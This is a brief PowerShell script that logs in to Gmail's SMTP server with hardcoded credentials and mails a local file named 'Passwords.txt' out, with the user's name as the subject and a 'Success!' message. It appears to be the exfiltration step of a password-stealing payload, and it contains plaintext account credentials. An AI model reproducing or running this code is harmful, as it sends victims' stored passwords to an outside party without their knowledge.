$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('testuser@scs.k12.al.us', 'testuser')
$E = New-Object System.Net.Mail.MailMessage
$E.From = 'testuser@scs.k12.al.us'
$E.To.Add('testuser@scs.k12.al.us')
$E.Subject = $env:UserName
$E.Body = 'Success! The password file is attached!'
$F = "Passwords.txt"
$E.Attachments.Add($F)
$SMTPInfo.Send($E)
exit
